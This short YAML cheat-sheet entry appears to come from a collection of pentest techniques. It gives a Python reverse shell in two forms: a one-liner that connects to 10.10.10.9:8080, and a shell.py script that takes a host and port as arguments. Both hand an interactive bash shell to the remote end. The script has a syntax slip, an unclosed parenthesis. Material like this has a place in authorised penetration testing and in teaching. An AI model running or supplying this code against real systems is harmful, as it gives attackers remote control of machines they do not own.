---
functions:
  shell:
    - description: Python reverse shell
      code: |

        python/3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.9",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

        
        Create a shell.py script and run with python/3 shell.py 10.1.1.246 9998:

        import socket,subprocess,os,sys
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((sys.argv[1],int(sys.argv[2]))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/bash","-i"])
---
